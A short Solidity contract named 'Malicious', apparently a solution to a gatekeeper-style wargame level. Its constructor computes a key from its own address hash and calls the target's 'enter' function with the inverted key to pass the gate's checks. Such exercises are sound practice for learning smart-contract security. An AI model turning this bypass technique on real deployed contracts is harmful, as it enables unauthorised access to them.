// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Malicious {

  constructor(address gateAddress_) {
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
    (bool success, bytes memory data) = gateAddress_.call(abi.encodeWithSignature("enter(bytes8)", ~key));
    require(success == true);
  }
  
}